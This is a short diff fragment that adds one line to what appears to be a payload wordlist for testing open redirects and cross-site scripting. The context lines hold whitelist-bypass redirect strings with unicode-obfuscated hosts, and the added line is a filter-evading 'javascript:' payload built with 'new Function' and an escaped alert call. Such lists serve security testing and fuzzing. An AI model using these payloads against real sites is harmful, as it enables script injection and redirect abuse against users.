@@ -484,3 +484,4 @@ javascript:alert(1)//https://www.whitelisteddomain.tld
 //Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ?
 //.@.@localdomain.pw
 //.@.@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+javascript:new%20Function`al\ert\`1\``;
